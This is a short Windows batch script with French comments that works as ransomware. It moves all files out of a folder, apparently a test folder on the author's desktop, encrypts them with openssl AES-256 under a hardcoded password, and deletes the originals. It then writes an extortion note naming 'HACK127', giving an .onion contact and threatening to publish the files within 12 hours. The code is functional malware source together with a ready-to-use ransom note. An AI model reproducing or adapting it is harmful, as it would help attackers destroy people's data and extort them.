@echo off
setlocal enabledelayedexpansion

REM @2023-CEVIK Meryem

REM Dossier source
set "source_folder=C:\Users\mcevi\OneDrive\Bureau\Mes_documents\Test1"

REM Dossier de destination
set "encrypted_folder=C:\Users\mcevi\OneDrive\Bureau\Mes_documents\Test1\encrypted"

REM Mot de passe pour le cryptage
set "mot_de_passe=HACK127_fOB0?a4?644x4aeR"

REM Création du dossier encrypted (s'il n'existe pas)
if not exist "%encrypted_folder%" mkdir "%encrypted_folder%"

REM Déplacement des fichiers depuis le dossier source vers le dossier encrypted (y compris les sous-dossiers)
for /r "%source_folder%" %%f in (*.*) do (
    move "%%f" "%encrypted_folder%\"
)

REM Cryptage des fichiers dans le dossier encrypted
for %%f in ("%encrypted_folder%\*.*") do (
    openssl enc -aes-256-cbc -salt -pass "pass:%mot_de_passe%" -in "%%f" -out "%%f.enc"
    del /q "%%f"
)

REM Création du fichier texte
echo YOUR FILES ARE ENCRYPTED BY HACK127 > "%source_folder%\readme.txt"
echo Don't worry, you can return all your files! >> "%source_folder%\readme.txt"
echo. >> "%source_folder%\readme.txt"
echo Install session messenger from this link : https://hack127.onion And chat with us. >> "%source_folder%\readme.txt"
echo Your ID is: 6768 >> "%source_folder%\readme.txt"
echo If you do not respond to us within 12 hours, your files will be published on the dark web. >> "%source_folder%\readme.txt"
echo. >> "%source_folder%\readme.txt"
echo Do not rename encrypted files. >> "%source_folder%\readme.txt"
echo Do not try to decrypt your data using third-party software, it may cause permanent data loss. >> "%source_folder%\readme.txt"

REM Fin du script
endlocal
